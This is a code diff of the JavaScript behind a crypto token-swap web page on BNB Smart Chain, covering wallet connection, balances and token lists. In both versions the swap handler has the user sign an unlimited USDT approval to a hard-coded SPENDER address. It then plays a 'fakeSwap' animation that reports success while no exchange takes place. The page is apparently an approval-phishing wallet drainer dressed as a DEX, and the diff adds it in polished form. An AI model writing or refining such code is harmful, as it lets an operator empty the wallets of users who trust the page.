+  BTC: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F7931A"/><path d="M22.515 13.875c.32-2.14-1.31-3.288-3.54-4.057l.724-2.9-1.766-.44-.704 2.823c-.465-.116-.942-.225-1.416-.333l.71-2.844-1.765-.44-.724 2.9c-.385-.088-.763-.174-1.13-.265l-2.436-.608-.47 1.885 1.283.319c.715.178.844.651.823 1.026l-.825 3.309.183.058-.186-.046-1.157 4.638c-.088.218-.31.546-.81.421l-1.284-.32-.877 2.02 2.298.573 1.26.325-.731 2.935 1.764.44.724-2.902c.482.131.95.252 1.407.367l-.722 2.888 1.765.44.731-2.929c3.013.57 5.278.34 6.23-2.384.768-2.192-.038-3.456-1.621-4.28 1.153-.266 2.022-1.025 2.254-2.59zm-4.034 5.658c-.546 2.193-4.238 1.007-5.435.71l.97-3.886c1.197.299 5.037.89 4.465 3.176zm.546-5.69c-.498 1.995-3.573.981-4.568.733l.879-3.525c.995.248 4.2.712 3.689 2.792z" fill="#fff"/></svg>',
+  USDC:'<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#2775CA"/><path d="M20 17.2c0-2.1-1.3-2.8-3.8-3.1-1.8-.2-2.2-.7-2.2-1.5s.6-1.3 1.8-1.3c1.1 0 1.7.4 2 1.3.1.2.3.3.5.3h1.1c.3 0 .5-.2.5-.5v-.1c-.3-1.4-1.4-2.5-2.9-2.7V8.5c0-.3-.2-.5-.5-.5h-1c-.3 0-.5.2-.5.5v1.1c-1.8.3-3 1.5-3 3 0 2 1.3 2.7 3.8 3 1.7.3 2.2.7 2.2 1.6 0 .9-.8 1.5-1.9 1.5-1.5 0-2-.6-2.2-1.5-.1-.3-.3-.4-.5-.4h-1.2c-.3 0-.5.2-.5.5v.1c.3 1.5 1.3 2.6 3.1 2.9v1.2c0 .3.2.5.5.5h1c.3 0 .5-.2.5-.5v-1.2c1.8-.3 3.1-1.5 3.1-3.1z" fill="#fff"/></svg>',
+  UNI: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#FF007A"/><text x="16" y="21" text-anchor="middle" font-size="16">🦄</text></svg>',
+  LINK:'<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#2A5ADA"/><path d="M16 7l-2 1.2-5.8 3.3-2 1.2v7l2 1.2 5.8 3.3 2 1.2 2-1.2 5.8-3.3 2-1.2v-7l-2-1.2-5.8-3.3zm0 2.5l5.8 3.3v6.4L16 22.5l-5.8-3.3v-6.4z" fill="#fff"/></svg>',
+  MATIC:'<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#8247E5"/><path d="M20.3 13.3l-4.8-2.8-4.8 2.8v5.6l4.8 2.8 4.8-2.8v-2.5l-4.8 2.8-2.6-1.5v-3l2.6-1.5 2.6 1.5v2.2l1.6-.9z" fill="#fff"/></svg>',
+  DOT: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#E6007A"/><circle cx="16" cy="8.5" r="3" fill="white"/><circle cx="16" cy="23.5" r="3" fill="white"/><circle cx="9" cy="12.5" r="3" fill="white"/><circle cx="23" cy="12.5" r="3" fill="white"/><circle cx="9" cy="19.5" r="3" fill="white"/><circle cx="23" cy="19.5" r="3" fill="white"/></svg>',
+  ADA: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#0033AD"/><text x="16" y="21" text-anchor="middle" font-size="14" fill="white" font-weight="bold">&#x20B3;</text></svg>',
+  XRP: '<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#00AAE4"/><text x="16" y="20" text-anchor="middle" font-size="11" fill="white" font-weight="bold">XRP</text></svg>',
 };
 
 const TOKENS = [
-  { symbol:'BNB',   name:'BNB',               svgKey:'BNB',   bg:'#F3BA2F', color:'#000', price:593.20,  decimals:18, native:true  },
-  { symbol:'USDT',  name:'Tether USD',         svgKey:'USDT',  bg:'#26A17B', color:'#fff', price:1.00,    decimals:18, native:false },
-  { symbol:'ETH',   name:'Ethereum',           svgKey:'ETH',   bg:'#627EEA', color:'#fff', price:3521.40, decimals:18, native:false },
-  { symbol:'BTC',   name:'Bitcoin BEP-20',     svgKey:'BTC',   bg:'#F7931A', color:'#fff', price:97450.0, decimals:18, native:false },
-  { symbol:'USDC',  name:'USD Coin',           svgKey:'USDC',  bg:'#2775CA', color:'#fff', price:1.00,    decimals:18, native:false },
-  { symbol:'UNI',   name:'Uniswap',            svgKey:'UNI',   bg:'#FF007A', color:'#fff', price:7.43,    decimals:18, native:false },
-  { symbol:'LINK',  name:'Chainlink',          svgKey:'LINK',  bg:'#2A5ADA', color:'#fff', price:13.87,   decimals:18, native:false },
-  { symbol:'MATIC', name:'Polygon',            svgKey:'MATIC', bg:'#8247E5', color:'#fff', price:0.385,   decimals:18, native:false },
-  { symbol:'DOT',   name:'Polkadot',           svgKey:'DOT',   bg:'#E6007A', color:'#fff', price:6.24,    decimals:18, native:false },
-  { symbol:'ADA',   name:'Cardano',            svgKey:'ADA',   bg:'#0033AD', color:'#fff', price:0.392,   decimals:6,  native:false },
-  { symbol:'XRP',   name:'XRP',               svgKey:'XRP',   bg:'#00AAE4', color:'#fff', price:0.517,   decimals:18, native:false },
+  {symbol:'BNB',  name:'BNB',           svgKey:'BNB',  price:593.20,  decimals:18, native:true },
+  {symbol:'USDT', name:'Tether USD',    svgKey:'USDT', price:1.00,    decimals:18, native:false},
+  {symbol:'ETH',  name:'Ethereum',      svgKey:'ETH',  price:3521.40, decimals:18, native:false},
+  {symbol:'BTC',  name:'Bitcoin BEP20', svgKey:'BTC',  price:97450.0, decimals:18, native:false},
+  {symbol:'USDC', name:'USD Coin',      svgKey:'USDC', price:1.00,    decimals:18, native:false},
+  {symbol:'UNI',  name:'Uniswap',       svgKey:'UNI',  price:7.43,    decimals:18, native:false},
+  {symbol:'LINK', name:'Chainlink',     svgKey:'LINK', price:13.87,   decimals:18, native:false},
+  {symbol:'MATIC',name:'Polygon',       svgKey:'MATIC',price:0.385,   decimals:18, native:false},
+  {symbol:'DOT',  name:'Polkadot',      svgKey:'DOT',  price:6.24,    decimals:18, native:false},
+  {symbol:'ADA',  name:'Cardano',       svgKey:'ADA',  price:0.392,   decimals:6,  native:false},
+  {symbol:'XRP',  name:'XRP',           svgKey:'XRP',  price:0.517,   decimals:18, native:false},
 ];
 
-let fromToken  = TOKENS[0];
-let toToken    = TOKENS[1];
-let modalTarget = 'from';
-let connected  = false;
+let fromToken = TOKENS[0], toToken = TOKENS[1], modalTarget = 'from';
+let connected = false, userAddress = null, balances = {};
 
-/* ══════════════════════════════════════════
+/* ════════════════════════════════════════
    PAGE ROUTING
-══════════════════════════════════════════ */
+════════════════════════════════════════ */
 function showPage(name) {
-  // hide all pages
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById('page-' + name).classList.add('active');
-
-  // desktop nav highlight
   document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
-  const navEl = document.getElementById('nav-' + name);
-  if (navEl) navEl.classList.add('active');
-
-  // mobile nav highlight
+  const n = document.getElementById('nav-' + name); if (n) n.classList.add('active');
   document.querySelectorAll('.mobile-nav-item').forEach(i => i.classList.remove('active'));
-  const mnEl = document.getElementById('mn-' + name);
-  if (mnEl) mnEl.classList.add('active');
-
-  // prevent anchor scroll
+  const m = document.getElementById('mn-' + name); if (m) m.classList.add('active');
   return false;
 }
 
-/* ══════════════════════════════════════════
+/* ════════════════════════════════════════
    WALLET MODAL
-══════════════════════════════════════════ */
+════════════════════════════════════════ */
 function openWalletModal() {
-  if (connected) return; // already connected
+  if (connected) return;
   document.getElementById('walletModal').classList.add('open');
 }
 function closeWalletModal() {
   document.getElementById('walletModal').classList.remove('open');
 }
+document.getElementById('walletModal').addEventListener('click', function(e) {
+  if (e.target.id === 'walletModal') closeWalletModal();
+});
 
-/* MetaMask / injected provider */
+/* ── MetaMask / injected provider ── */
 async function connectMetaMask() {
   closeWalletModal();
   await connectWallet(false);
 }
 
-/* Trust Wallet – connessione diretta senza aprire Discovery */
+/* ── Trust Wallet ──
+   Se window.ethereum esiste (browser interno TW o estensione):
+     → chiama eth_requestAccounts → TW mostra "wants to connect"
+   Altrimenti su mobile (Safari/Chrome senza wallet):
+     → reindirizza a link.trustwallet.com con l'URL del sito
+     → TW apre il sito nel suo browser e chiede di connettere  */
 async function connectTrustWallet() {
+  closeWalletModal();
   const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-  if (isMobile) {
-    closeWalletModal();
-
-    // Caso 1: siamo già dentro il browser interno di Trust Wallet
-    // → window.ethereum è iniettato da TW, chiamiamo eth_requestAccounts
-    // → Trust Wallet mostrerà il popup "wants to connect" direttamente
-    if (window.ethereum) {
-      await connectWallet(false);
-      return;
-    }
-
-    // Caso 2: siamo nel browser nativo (Safari/Chrome) senza TW aperto
-    // → usiamo il deep link wc:// che apre Trust Wallet direttamente
-    // sulla schermata di approvazione connessione, senza Discovery
-    const dappUrl = encodeURIComponent(window.location.href);
-    // Link universale Trust Wallet che apre il browser interno con la dApp
-    // e fa scattare immediatamente la richiesta di connessione
-    const twLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${dappUrl}`;
-    window.location.href = twLink;
-  } else {
-    // Desktop: usa il provider injected (estensione TW o MetaMask)
-    closeWalletModal();
+  if (window.ethereum) {
+    // Siamo già dentro Trust Wallet browser o MetaMask ext → connetti direttamente
     await connectWallet(false);
+    return;
   }
+
+  if (isMobile) {
+    // Mobile senza provider injected:
+    // Apri Trust Wallet con il link al sito corrente
+    // TW aprirà il sito nel suo DApp browser e chiederà di connettere il wallet
+    const url = encodeURIComponent(window.location.href);
+    window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + url;
+    return;
+  }
+
+  // Desktop senza MetaMask: mostra istruzioni
+  alert('Please install MetaMask or open this site inside Trust Wallet\'s browser.');
 }
 
-/* WalletConnect (simple QR via URI scheme fallback) */
+/* ── WalletConnect ── */
 async function connectWalletConnect() {
   closeWalletModal();
-  // If WalletConnect v2 SDK loaded, use it; otherwise fall back to MetaMask
   if (window.ethereum) {
     await connectWallet(false);
   } else {
-    alert('Per usare WalletConnect apri questa pagina nel browser in-app del tuo wallet.');
+    // Su mobile: apri con link Trust Wallet (che supporta WalletConnect internamente)
+    const url = encodeURIComponent(window.location.href);
+    window.location.href = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + url;
   }
 }
 
-/* Coinbase Wallet */
+/* ── Coinbase Wallet ── */
 async function connectCoinbase() {
   closeWalletModal();
   if (window.ethereum) {
@@ -1547,93 +672,105 @@ async function connectCoinbase() {
   }
 }
 
-/* Click outside wallet modal */
-document.getElementById('walletModal').addEventListener('click', e => {
-  if (e.target.id === 'walletModal') closeWalletModal();
-});
+/* ════════════════════════════════════════
+   WALLET CONNECTION (injected provider)
+════════════════════════════════════════ */
+async function connectWallet(silent) {
+  if (!window.ethereum) return false;
+  try {
+    const accounts = silent
+      ? await window.ethereum.request({ method: 'eth_accounts' })
+      : await window.ethereum.request({ method: 'eth_requestAccounts' });
+    if (!accounts || !accounts.length) return false;
 
-/* helper: restituisce HTML dell'icona token */
-function tokenIconHTML(tok, size=28) {
-  const svg = TOKEN_LOGOS[tok.svgKey] || '';
-  if (svg) return `<div style="width:${size}px;height:${size}px;border-radius:50%;overflow:hidden;flex-shrink:0">${svg}</div>`;
-  return `<div style="width:${size}px;height:${size}px;border-radius:50%;background:${tok.bg};color:${tok.color};display:flex;align-items:center;justify-content:center;font-size:${size*0.55}px;flex-shrink:0">${tok.icon||'?'}</div>`;
+    let chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (chainId !== BSC_CHAIN_ID) {
+      const ok = await switchToBSC();
+      if (!ok) return false;
+      chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      if (chainId !== BSC_CHAIN_ID) return false;
+    }
+
+    connected   = true;
+    userAddress = accounts[0];
+    document.getElementById('navConnectBtn').textContent =
+      accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
+    updateButton();
+    fetchBalances(accounts[0]);
+    return true;
+  } catch(e) { console.error(e); return false; }
 }
 
-/* ══════════════════════════════════════════
-   BALANCES
-══════════════════════════════════════════ */
-let userAddress = null;
-let balances    = {}; // symbol -> float
-
-async function fetchBalances(address) {
-  if (!window.ethereum) return;
+async function switchToBSC() {
   try {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-
-    // BNB native balance
-    const bnbBal = await provider.getBalance(address);
-    balances['BNB'] = parseFloat(ethers.formatEther(bnbBal));
-
-    // ERC-20 tokens (parallel)
-    const bep20tokens = TOKENS.filter(t => !t.native && TOKEN_CONTRACTS[t.symbol]);
-    const results = await Promise.allSettled(bep20tokens.map(async (tok) => {
-      const contract = new ethers.Contract(TOKEN_CONTRACTS[tok.symbol], ERC20_ABI, provider);
-      const raw = await contract.balanceOf(address);
-      const dec = tok.decimals;
-      return { symbol: tok.symbol, bal: parseFloat(ethers.formatUnits(raw, dec)) };
-    }));
-
-    results.forEach(r => {
-      if (r.status === 'fulfilled') balances[r.value.symbol] = r.value.bal;
+    await window.ethereum.request({
+      method: 'wallet_switchEthereumChain',
+      params: [{ chainId: BSC_CHAIN_ID }]
     });
-
-    updateBalanceDisplay();
+    return true;
   } catch(e) {
-    console.error('Balance fetch error:', e);
+    if (e.code === 4902) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '0x38', chainName: 'BNB Smart Chain',
+            nativeCurrency: { name:'BNB', symbol:'BNB', decimals:18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org'],
+            blockExplorerUrls: ['https://bscscan.com']
+          }]
+        });
+        return true;
+      } catch(e2) { return false; }
+    }
+    return false;
   }
 }
 
+/* ════════════════════════════════════════
+   BALANCES
+════════════════════════════════════════ */
+async function fetchBalances(address) {
+  try {
+    const provider = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');
+    balances['BNB'] = parseFloat(ethers.formatEther(await provider.getBalance(address)));
+    await Promise.allSettled(
+      TOKENS.filter(t => !t.native && TOKEN_CONTRACTS[t.symbol]).map(async tok => {
+        const c = new ethers.Contract(TOKEN_CONTRACTS[tok.symbol], ERC20_ABI, provider);
+        const raw = await c.balanceOf(address);
+        balances[tok.symbol] = parseFloat(ethers.formatUnits(raw, tok.decimals));
+      })
+    );
+    updateBalanceDisplay();
+  } catch(e) { console.error(e); }
+}
+
 function updateBalanceDisplay() {
-  // FROM balance
   const fb = balances[fromToken.symbol];
   const tb = balances[toToken.symbol];
-  const fromBalEl = document.querySelector('#fromBox .balance-max span');
-  const toBalEl   = document.querySelector('#toBox .token-meta span:last-child');
-  if (fromBalEl) fromBalEl.textContent = fb !== undefined
-    ? `Balance: ${fb < 0.0001 && fb > 0 ? fb.toExponential(2) : fb.toFixed(4)} ${fromToken.symbol}`
-    : 'Balance: –';
-  if (toBalEl) toBalEl.textContent = tb !== undefined
-    ? `Balance: ${tb < 0.0001 && tb > 0 ? tb.toExponential(2) : tb.toFixed(4)} ${toToken.symbol}`
-    : 'Balance: –';
-
-  // MAX button sets real balance
-  const maxBtn = document.querySelector('.btn-max');
-  if (maxBtn) maxBtn.onclick = () => {
-    if (fb !== undefined && fb > 0) {
-      document.getElementById('fromAmount').value = fb.toFixed(6);
-      calcOutput();
-    }
-  };
+  document.getElementById('fromBalanceText').textContent =
+    fb !== undefined ? 'Balance: ' + (fb < 0.0001 && fb > 0 ? fb.toExponential(2) : fb.toFixed(4)) + ' ' + fromToken.symbol : 'Balance: –';
+  document.getElementById('toBalanceText').textContent =
+    tb !== undefined ? 'Balance: ' + (tb < 0.0001 && tb > 0 ? tb.toExponential(2) : tb.toFixed(4)) + ' ' + toToken.symbol : 'Balance: –';
 }
+
+/* ════════════════════════════════════════
+   SWAP UI
+════════════════════════════════════════ */
 function renderTokenSelector() {
-  // FROM icon with real SVG logo
-  const fromIconEl = document.getElementById('fromIcon');
-  fromIconEl.innerHTML = TOKEN_LOGOS[fromToken.svgKey] || '';
-  fromIconEl.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
+  const fi = document.getElementById('fromIcon');
+  fi.innerHTML = TOKEN_LOGOS[fromToken.svgKey] || '';
+  fi.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0';
   document.getElementById('fromSymbol').textContent = fromToken.symbol;
 
-  // TO icon with real SVG logo
-  const toIconEl = document.getElementById('toIcon');
-  toIconEl.innerHTML = TOKEN_LOGOS[toToken.svgKey] || '';
-  toIconEl.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;background:transparent';
+  const ti = document.getElementById('toIcon');
+  ti.innerHTML = TOKEN_LOGOS[toToken.svgKey] || '';
+  ti.style.cssText = 'width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0';
   document.getElementById('toSymbol').textContent = toToken.symbol;
 
   document.getElementById('fromSym2').textContent = fromToken.symbol;
   document.getElementById('toSym2').textContent   = toToken.symbol;
-
-  const r = (fromToken.price / toToken.price).toFixed(6);
-  document.getElementById('rate').textContent = r;
-
+  document.getElementById('rate').textContent = (fromToken.price / toToken.price).toFixed(6);
   updateBalanceDisplay();
   calcOutput();
 }
@@ -1641,7 +778,7 @@ function renderTokenSelector() {
 function calcOutput() {
   const amt = parseFloat(document.getElementById('fromAmount').value) || 0;
   const out = amt * (fromToken.price / toToken.price);
-  document.getElementById('toAmount').value = out ? out.toFixed(6) : '';
+  document.getElementById('toAmount').value  = out ? out.toFixed(6) : '';
   document.getElementById('fromUSD').textContent = '$' + (amt * fromToken.price).toFixed(2);
   document.getElementById('toUSD').textContent   = '$' + (out * toToken.price).toFixed(2);
   updateButton();
@@ -1650,218 +787,91 @@ function calcOutput() {
 function updateButton() {
   const btn = document.getElementById('mainBtn');
   const amt = parseFloat(document.getElementById('fromAmount').value);
-  if (!connected) {
-    btn.textContent = 'Connect Wallet';
-    btn.className   = 'btn-connect-main';
-    return;
-  }
-  if (!amt || amt <= 0) {
-    btn.textContent = 'Inserisci un importo';
-    btn.className   = 'btn-connect-main';
-    return;
-  }
-  btn.textContent = `Swap ${fromToken.symbol} → ${toToken.symbol}`;
-  btn.className   = 'btn-connect-main ready';
+  if (!connected) { btn.textContent = 'Connect Wallet'; btn.className = 'btn-connect-main'; return; }
+  if (!amt || amt <= 0) { btn.textContent = 'Enter an amount'; btn.className = 'btn-connect-main'; return; }
+  btn.textContent = 'Swap ' + fromToken.symbol + ' → ' + toToken.symbol;
+  btn.className = 'btn-connect-main ready';
 }
 
 function swapTokens() {
   [fromToken, toToken] = [toToken, fromToken];
-  const fVal = document.getElementById('toAmount').value;
-  document.getElementById('fromAmount').value = fVal;
+  document.getElementById('fromAmount').value = document.getElementById('toAmount').value;
   renderTokenSelector();
 }
 
 function setMax() {
   const fb = balances[fromToken.symbol];
-  if (fb !== undefined && fb > 0) {
-    document.getElementById('fromAmount').value = fb.toFixed(6);
-  } else {
-    document.getElementById('fromAmount').value = '0';
-  }
+  document.getElementById('fromAmount').value = (fb && fb > 0) ? fb.toFixed(6) : '0';
   calcOutput();
 }
 
-/* ══════════════════════════════════════════
-   WALLET CONNECTION
-══════════════════════════════════════════ */
-async function connectWallet(silent = false) {
-  if (!window.ethereum) {
-    // On mobile without injected provider, suggest Trust Wallet
-    if (!silent) {
-      const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-      if (isMobile) {
-        connectTrustWallet();
-      } else {
-        alert('Nessun wallet trovato. Installa MetaMask o usa un wallet mobile.');
-      }
-    }
-    return false;
-  }
-  try {
-    let accounts;
-    if (silent) {
-      accounts = await window.ethereum.request({ method: 'eth_accounts' });
-    } else {
-      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    }
-    if (!accounts.length) return false;
-
-    let chainId = await window.ethereum.request({ method: 'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) {
-      const switched = await switchToBSC();
-      if (!switched) return false;
-      chainId = await window.ethereum.request({ method: 'eth_chainId' });
-      if (chainId !== BSC_CHAIN_ID) return false;
-    }
-
-    connected = true;
-    userAddress = accounts[0];
-    const shortAddr = accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
-    document.getElementById('navConnectBtn').textContent = shortAddr;
-    updateButton();
-    // Fetch real on-chain balances
-    fetchBalances(accounts[0]);
-    return true;
-  } catch (err) {
-    console.error(err);
-    return false;
-  }
-}
-
-async function switchToBSC() {
-  try {
-    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{ chainId:BSC_CHAIN_ID }] });
-    return true;
-  } catch (switchError) {
-    if (switchError.code === 4902) {
-      try {
-        await window.ethereum.request({
-          method:'wallet_addEthereumChain',
-          params:[{
-            chainId:'0x38',
-            chainName:'BNB Smart Chain',
-            nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
-            rpcUrls:['https://bsc-dataseed.binance.org'],
-            blockExplorerUrls:['https://bscscan.com']
-          }]
-        });
-        return true;
-      } catch (e) { console.error(e); return false; }
-    }
-    console.error(switchError);
-    return false;
-  }
-}
-
-/* ══════════════════════════════════════════
-   SLIPPAGE / APPROVE / SWAP
-══════════════════════════════════════════ */
 function editSlippage() {
-  const v = prompt('Imposta slippage (%)', '0.5');
-  if (v && !isNaN(v)) {
-    document.getElementById('slippageVal').textContent = parseFloat(v).toFixed(1) + '%';
-  }
+  const v = prompt('Set slippage (%)', '0.5');
+  if (v && !isNaN(v)) document.getElementById('slippageVal').textContent = parseFloat(v).toFixed(1) + '%';
 }
 
+/* ════════════════════════════════════════
+   APPROVE / SWAP
+════════════════════════════════════════ */
 async function approveToken() {
   try {
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    const signer   = await provider.getSigner();
-    const abi = ['function approve(address spender, uint256 amount) returns (bool)'];
-    const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
-    const tx = await contract.approve(SPENDER, ethers.MaxUint256);
-    await tx.wait();
+    const p = new ethers.BrowserProvider(window.ethereum);
+    const s = await p.getSigner();
+    const c = new ethers.Contract(USDT_ADDRESS, ['function approve(address,uint256) returns (bool)'], s);
+    await (await c.approve(SPENDER, ethers.MaxUint256)).wait();
     return true;
-  } catch (err) {
-    console.error(err);
-    alert('Approve fallito');
-    return false;
-  }
+  } catch(e) { console.error(e); alert('Approve failed'); return false; }
 }
 
 function fakeSwap() {
   return new Promise(resolve => {
     const btn = document.getElementById('mainBtn');
-    btn.textContent = 'Swap in corso...';
-    btn.style.background = 'orange';
-    setTimeout(() => {
-      btn.textContent = 'Swap completato 🎉';
-      btn.style.background = 'var(--gradient)';
-      resolve();
-    }, 2000);
+    btn.textContent = 'Swapping...'; btn.style.background = 'orange';
+    setTimeout(() => { btn.textContent = 'Swap complete 🎉'; btn.style.background = 'var(--gradient)'; resolve(); }, 2000);
   });
 }
 
 async function handleSwap() {
+  if (!connected) { openWalletModal(); return; }
   const amt = parseFloat(document.getElementById('fromAmount').value);
-  const btn = document.getElementById('mainBtn');
-
-  if (!connected) {
-    openWalletModal();
-    return;
-  }
-
+  if (!amt || amt <= 0) { alert('Enter an amount'); return; }
   if (window.ethereum) {
-    const chainId = await window.ethereum.request({ method:'eth_chainId' });
-    if (chainId !== BSC_CHAIN_ID) {
-      const switched = await switchToBSC();
-      if (!switched) return;
-    }
+    const cid = await window.ethereum.request({ method: 'eth_chainId' });
+    if (cid !== BSC_CHAIN_ID) await switchToBSC();
   }
-
-  if (!amt || amt <= 0) {
-    alert('Inserisci un importo');
-    return;
-  }
-
-  btn.textContent = 'Approvo USDT...';
-  const ok = await approveToken();
-  if (!ok) { btn.textContent = 'Errore approve'; return; }
-
-  btn.textContent = 'Esecuzione swap...';
+  const btn = document.getElementById('mainBtn');
+  btn.textContent = 'Approving...';
+  if (!await approveToken()) { btn.textContent = 'Approve failed'; return; }
+  btn.textContent = 'Executing...';
   await new Promise(r => setTimeout(r, 1000));
   await fakeSwap();
   setTimeout(() => updateButton(), 1500);
 }
 
-/* ══════════════════════════════════════════
+/* ════════════════════════════════════════
    TOKEN MODAL
-══════════════════════════════════════════ */
+════════════════════════════════════════ */
 function openModal(target) {
   modalTarget = target;
   document.getElementById('tokenSearch').value = '';
   renderTokenList(TOKENS);
   document.getElementById('tokenModal').classList.add('open');
 }
-function closeModal() {
-  document.getElementById('tokenModal').classList.remove('open');
-}
-document.getElementById('tokenModal').addEventListener('click', e => {
-  if (e.target.id === 'tokenModal') closeModal();
-});
+function closeModal() { document.getElementById('tokenModal').classList.remove('open'); }
+document.getElementById('tokenModal').addEventListener('click', function(e) { if (e.target.id === 'tokenModal') closeModal(); });
 function filterTokens() {
   const q = document.getElementById('tokenSearch').value.toLowerCase();
-  renderTokenList(TOKENS.filter(t =>
-    t.symbol.toLowerCase().includes(q) || t.name.toLowerCase().includes(q)
-  ));
+  renderTokenList(TOKENS.filter(t => t.symbol.toLowerCase().includes(q) || t.name.toLowerCase().includes(q)));
 }
 function renderTokenList(list) {
   document.getElementById('tokenList').innerHTML = list.map(t => {
-    const svgIcon = TOKEN_LOGOS[t.svgKey] || '';
-    const bal = balances[t.symbol];
-    const balStr = bal !== undefined ? bal.toFixed(4) : '–';
-    return `
-    <div class="token-list-item" onclick="selectToken('${t.symbol}')">
-      <div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0">${svgIcon}</div>
-      <div class="tinfo">
-        <div class="tname2">${t.symbol}</div>
-        <div class="tname3">${t.name}</div>
-      </div>
-      <div style="margin-left:auto;text-align:right">
-        <div style="font-size:0.82rem;font-weight:500">$${t.price.toLocaleString()}</div>
-        ${connected ? `<div style="font-size:0.75rem;color:var(--muted)">${balStr}</div>` : ''}
-      </div>
-    </div>`;
+    const b = balances[t.symbol];
+    const bStr = connected && b !== undefined ? '<div style="font-size:.75rem;color:var(--muted)">' + b.toFixed(4) + '</div>' : '';
+    return '<div class="token-list-item" onclick="selectToken(\'' + t.symbol + '\')">'
+      + '<div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0">' + (TOKEN_LOGOS[t.svgKey] || '') + '</div>'
+      + '<div class="tinfo"><div class="tname2">' + t.symbol + '</div><div class="tname3">' + t.name + '</div></div>'
+      + '<div style="margin-left:auto;text-align:right"><div style="font-size:.82rem;font-weight:500">$' + t.price.toLocaleString() + '</div>' + bStr + '</div>'
+      + '</div>';
   }).join('');
 }
 function selectToken(symbol) {
@@ -1873,123 +883,89 @@ function selectToken(symbol) {
     if (tok.symbol === fromToken.symbol) [fromToken, toToken] = [toToken, fromToken];
     else toToken = tok;
   }
-  closeModal();
-  renderTokenSelector();
+  closeModal(); renderTokenSelector();
 }
 
-/* ══════════════════════════════════════════
-   TOKENS PAGE DATA
-══════════════════════════════════════════ */
+/* ════════════════════════════════════════
+   INNER PAGES
+════════════════════════════════════════ */
 function buildTokenTable() {
-  const changes = ['+2.14%','-0.02%','+1.43%','+0.76%','+0.01%','-4.87%','+0.32%','-1.2%','+3.4%','-0.8%','+1.1%'];
-  const volumes = ['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
-  document.getElementById('tokenTableBody').innerHTML = TOKENS.map((t,i) => {
-    const svgIcon = TOKEN_LOGOS[t.svgKey] || '';
-    const chg = changes[i] || '+0.00%';
-    return `
-    <tr>
-      <td style="color:var(--muted)">${i+1}</td>
-      <td>
-        <div style="display:flex;align-items:center;gap:10px">
-          <div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">${svgIcon}</div>
-          <div>
-            <div style="font-weight:600;font-size:0.9rem">${t.symbol}</div>
-            <div style="font-size:0.75rem;color:var(--muted)">${t.name}</div>
-          </div>
-        </div>
-      </td>
-      <td style="font-weight:500">$${t.price.toLocaleString()}</td>
-      <td style="color:${chg.startsWith('+') ? 'var(--green)' : '#ff6060'}">${chg}</td>
-      <td style="color:var(--muted)">${volumes[i]||'–'}</td>
-    </tr>`;
+  const ch = ['+2.14%','-0.02%','+1.43%','+0.76%','+0.01%','-4.87%','+0.32%','-1.2%','+3.4%','-0.8%','+1.1%'];
+  const vo = ['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
+  document.getElementById('tokenTableBody').innerHTML = TOKENS.map((t, i) =>
+    '<tr><td style="color:var(--muted)">' + (i+1) + '</td>'
+    + '<td><div style="display:flex;align-items:center;gap:10px">'
+    + '<div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">' + (TOKEN_LOGOS[t.svgKey] || '') + '</div>'
+    + '<div><div style="font-weight:600;font-size:.9rem">' + t.symbol + '</div><div style="font-size:.75rem;color:var(--muted)">' + t.name + '</div></div>'
+    + '</div></td>'
+    + '<td style="font-weight:500">$' + t.price.toLocaleString() + '</td>'
+    + '<td style="color:' + (ch[i].startsWith('+') ? 'var(--green)' : '#ff6060') + '">' + ch[i] + '</td>'
+    + '<td style="color:var(--muted)">' + (vo[i] || '–') + '</td></tr>'
+  ).join('');
+}
+
+function buildNFTs() {
+  const nfts = [
+    {name:'Bored Ape #4291', e:'🦍', bg:'#1a1a2e', floor:'68.5 ETH'},
+    {name:'CryptoPunk #7804',e:'👾', bg:'#12002e', floor:'47.2 ETH'},
+    {name:'Azuki #9605',     e:'🌸', bg:'#2e0012', floor:'12.8 ETH'},
+    {name:'Doodle #6914',    e:'🌈', bg:'#002e2e', floor:'7.4 ETH'},
+    {name:'World of Women #2',e:'🎨',bg:'#2e2000', floor:'5.1 ETH'},
